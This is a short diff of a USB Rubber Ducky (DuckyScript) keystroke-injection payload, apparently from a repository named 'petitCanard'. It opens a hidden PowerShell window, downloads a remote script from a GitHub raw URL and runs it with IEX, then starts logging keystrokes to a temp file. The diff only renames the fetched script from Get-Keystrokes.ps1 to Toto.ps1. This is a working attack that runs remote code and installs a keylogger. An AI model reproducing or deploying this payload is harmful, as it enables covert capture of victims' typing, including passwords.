@@ -4,7 +4,7 @@ DELAY 500
 STRING powershell -WindowStyle hidden
 ENTER
 DELAY 1500
-STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/HE-Arc/petitCanard/master/powershell_scripts/Get-Keystrokes.ps1')
+STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/HE-Arc/petitCanard/master/powershell_scripts/Toto.ps1')
 ENTER
 DELAY 400
 STRING Get-Keystrokes -LogPath $env:temp\key.log
